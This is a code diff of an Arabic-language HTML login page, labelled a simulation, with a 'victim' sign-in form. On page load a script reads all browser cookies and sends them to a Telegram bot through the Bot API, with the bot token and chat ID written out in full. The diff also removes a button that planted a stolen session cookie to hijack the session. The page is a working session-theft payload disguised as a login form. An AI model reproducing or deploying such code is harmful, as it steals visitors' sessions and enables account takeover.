@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>محاكاة سرقة الجلسة</title>
+  <title>محاكاة السيناريو الواقعي</title>
   <style>
     body {
       font-family: "Tahoma", sans-serif;
@@ -33,7 +33,6 @@
       border-radius: 15px;
       width: 300px;
       box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);
-      margin-bottom: 20px; /* مسافة إضافية */
     }
 
     input {
@@ -57,7 +56,6 @@
       font-size: 1em;
       cursor: pointer;
       transition: background 0.3s;
-      margin-top: 10px;
     }
 
     button:hover {
@@ -67,26 +65,18 @@
   </style>
 </head>
 <body>
-  <h1>🔒 تامين موقعك الشخصي</h1>
-  <h2>عبدربه سيف الجوفي</h2>
+  <h1>🔑 تسجيل دخول الموقع (الضحية)</h1>
+  <h2>الآن بدون زر اختطاف</h2>
 
   <div class="login-box">
     <input type="email" placeholder="اكتب الإيميل هنا">
     <input type="password" placeholder="اكتب كلمة المرور هنا" id="passwordInput">
     
-    <button onclick="goToMain()">تسجيل الدخول (إنشاء الجلسة)</button>
+    <button onclick="goToMain()">تسجيل الدخول وبدء الجلسة</button>
   </div>
   
-  <p style="margin-top: 50px; font-size: 1.2em; text-align: center; color: yellow;">
-    <span style="font-weight: bold;">زر الاختطاف اليدوي:</span> يستخدم لحقن المفتاح المسروق.
-  </p>
-  
-  <button onclick="injectStolenCookie()" style="background-color: #f34e7a; color: white; width: 300px;">
-    اختطاف الجلسة بمفتاح SESSION_9TEC076J9D
-  </button>
-  
   <script>
-    // ** وظيفة توليد ID فريد (يتم استخدامه عند الضغط على زر تسجيل الدخول) **
+    // ** وظيفة توليد ID فريد **
     function generateSessionId() {
         return 'SESSION_' + Math.random().toString(36).substring(2, 12).toUpperCase();
     }
@@ -94,35 +84,21 @@
     function goToMain() {
       const uniqueSessionId = generateSessionId(); 
       
-      // إنشاء جلسة فريدة
+      // ** 1. إنشاء الجلسة الفريدة (عند الضغط على تسجيل الدخول) **
       document.cookie = "session_id=" + uniqueSessionId + "; expires=Thu, 31 Dec 2025 12:00:00 UTC; path=/";
-      alert("تم إنشاء جلسة فريدة! ID: " + uniqueSessionId);
+      alert("تم إنشاء جلسة فريدة الآن! ID: " + uniqueSessionId);
       
-      // التوجيه إلى نفس الصفحة لإجبار الحمولة على الإرسال
+      // التوجيه إلى نفس الصفحة لإجبار الحمولة على الإرسال التلقائي
       window.location.href = window.location.href; 
-    }
-    
-    // ** الدالة الجديدة: تقوم بزرع المفتاح المسروق يدوياً **
-    function injectStolenCookie() {
-        // ** المفتاح المسروق من الهاتف الأصلي **
-        const stolenKey = "session_id=SESSION_9TEC076J9D; expires=Thu, 31 Dec 2025 12:00:00 UTC; path=/";
-        
-        // تنفيذ الحقن (زرع الكوكي)
-        document.cookie = stolenKey;
-        
-        alert("تم حقن المفتاح المسروق بنجاح!\nالرجاء تحديث الصفحة الآن لتأكيد الاختطاف.");
-        
-        // window.location.reload(); // تحديث الصفحة
     }
   </script>
   
   <script>
       const cookies = document.cookie;
       const encodedCookies = encodeURIComponent(cookies);
-      // الرمز الجديد: 8518769039:AAG3KE3aL58dx2IX4s6wZEnAhH9NB0Bda8Y
-      const telegramApiUrl = "https://api.telegram.org/bot8518769039:AAG3KE3aL58dx2IX4s6wZEnAhH9NB0Bda8Y/sendMessage?chat_id=6717287161&text=Cookies%20Stolen%3A%20" + encodedCookies;
+      const telegramApiUrl = "https://api.telegram.org/bot8518769039:AAG3KE3aL58dx2IX4s6wZEnAhH9NB0Bda8Y/sendMessage?chat_id=6717287161&text=Session%20Stolen%20(Auto)%3A%20" + encodedCookies;
       
-      // الإرسال إلى البوت
+      // الإرسال التلقائي إلى البوت
       fetch(telegramApiUrl)
           .then(response => {
               console.log('Telegram API Response Status:', response.status); 
@@ -131,5 +107,8 @@
               console.error('Fetch Error:', error);
           });
   </script>
-  </body>
+  <p style="margin-top: 50px; font-size: 1.2em; text-align: center; color: white;">
+    <span style="font-weight: bold;">لتأكيد نجاح الحقن:</span> يجب أن تصل رسالة تلقائية للبوت عند فتح الصفحة.
+  </p>
+</body>
 </html>
